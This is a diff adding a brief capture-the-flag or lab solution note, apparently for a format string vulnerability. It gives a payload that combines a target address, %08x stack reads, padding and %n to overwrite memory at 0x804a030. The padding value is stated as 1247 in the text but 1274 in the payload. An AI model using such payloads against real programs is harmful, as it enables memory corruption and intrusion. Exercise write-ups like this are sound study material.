@@ -1,0 +1,10 @@
+%08x shows the contents at the current location.
+
+Tried diff number of %08x every time till reached address 0x804a030 as mentioned in the assemble code.
+
+
+Solution:
+
+"\x30\xa0\x04\x08 %08x %08x %08x %08x %08x %1274x %n"
+
+Used gdb to check value overwritten till now and adjusted value(1247) according to that.
